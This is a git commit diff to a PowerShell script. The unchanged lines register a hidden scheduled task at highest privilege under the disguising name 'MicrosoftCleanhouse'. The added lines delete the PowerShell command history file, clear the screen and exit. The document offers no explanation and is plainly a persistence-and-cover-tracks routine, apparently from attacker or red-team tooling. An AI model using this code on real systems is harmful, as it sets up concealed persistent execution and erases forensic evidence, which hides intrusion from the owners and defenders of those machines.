e0e83e00bedc3254839975b77b0334b74da7c1b1
skekic16 <151707511+skekic16@users.noreply.github.com>
2024-01-03 13:11:26 -0600

    Update task1.ps1

--- task1.ps1
+++ task1.ps1
@@ -4,3 +4,6 @@ $principal = New-ScheduledTaskPrincipal -UserID 'DOMAIN\user' -RunLevel Highest
 $settings = New-ScheduledTaskSettingsSet -Hidden -RunOnlyIfNetworkAvailable
 $task = New-ScheduledTask -Action $action -Principal $principal -Trigger $trigger -Settings $settings
 Register-ScheduledTask T1 -InputObject $task -Force -TaskName MicrosoftCleanhouse -User $env:UserName
+Remove-Item (Get-PSreadlineOption).HistorySavePath
+cls
+exit
